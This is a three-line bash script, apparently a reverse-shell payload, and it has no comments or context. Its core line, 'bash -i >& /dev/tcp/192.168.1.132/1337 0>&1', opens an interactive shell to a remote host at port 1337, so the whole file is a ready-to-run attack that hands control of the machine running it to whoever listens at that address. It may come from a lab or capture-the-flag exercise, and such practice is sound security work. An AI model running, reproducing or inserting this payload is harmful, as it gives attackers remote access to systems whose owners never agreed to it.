#!/bin/bash
bash -i >& /dev/tcp/192.168.1.132/1337 0>&1
wait
